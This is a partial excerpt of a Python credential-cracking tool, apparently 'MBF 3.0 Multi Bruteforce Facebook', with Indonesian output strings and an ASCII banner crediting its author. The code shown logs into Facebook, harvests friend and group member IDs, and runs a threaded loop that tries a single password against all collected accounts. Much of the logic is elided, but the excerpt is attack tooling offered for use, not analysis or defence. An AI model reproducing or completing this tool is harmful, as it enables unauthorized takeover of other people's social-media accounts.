...
def crack0(data,sandi):
	akun = []
	cetak('!c[*] MengCrack !k%d Akun !cdengan sandi !m[!k%s!m]'%(len(data),sandi))
	cetak('!c[*] Cracking  !k0!m%',1)
	sys.stdout.flush()
	jml0,jml1 = 0,0
	th = []
	for i in data:
...
def login():
	...
	if 'save-device' in url or 'm_sess' in url:
		...
		cetak('!c[*] Selamat datang !k%s'%nama)
		cetak('!c[*] Semoga ini adalah hari keberuntungan mu...')
		log = 1
...
def idgroup():
	if log != 1:
		cetak('!h[*] Login !bFB!h dulu beibz...')
		login()
		if log == 0:
			keluar()
...
def idteman():
	if log != 1:
		cetak('!c[*] Login !bFB !cdulu beibz...')
		login()
		if log == 0:
			keluar()
	cetak('!c[*] Sedang mengumpulkan id teman...')
	buka('https://free.facebook.com/friends/center/mbasic/?fb_ref=bm&sr=1&ref_component=mbasic_bookmark&ref_page=XMenuController')
	...
	saring_id_teman(buka('https://free.facebook.com/friends/center/friends/?fb_ref=fbm&ref_component=mbasic_bookmark&ref_page=XMenuController'))
	try:
	...
	while 1:
		...
		cetak('\r!h[*] !p%s !cid terambil...'%len(id_bteman),1)
		sys.stdout.flush()
		try:
			next = br.find_link(url_regex='friends_center_main').url
		except:
...
def menu():
  ...
  !k*   !k* !p/+/++//
   \ /  |/__//
 !p{!mX!p}v{!mX!p}!0!b|!mMBF!c|!p=!k=!p=!k=!p=!k=!p=!k=!p=!k=.
   !p(!m'!p)!0  !p/'|'\           !p\\
       !p/  \  \          !k'
       !p\_  \_ \_   !k___!mMBF !c3.0!k___

 !m* !kMULTI !mBRUTEFORCE !bFACEBOOK
 !m* !cC!bL!pA!kR!hI!kS!bH!mA !pO!hC!kT!bA
 !m* !phttps://github.com/clarisha
 !m* !phttps://facebook.com/clarisha.octa.3
 !m* !phttps://anonymous-girl.onion
!k.======================.
|!m  AMBIL !bID!m DARI.....  !k|
'======================'
!k#!p1 !cDAFTAR TEMAN
!k#!p2 !cANGGOTA GROUP
!k#!p3 !bFILE
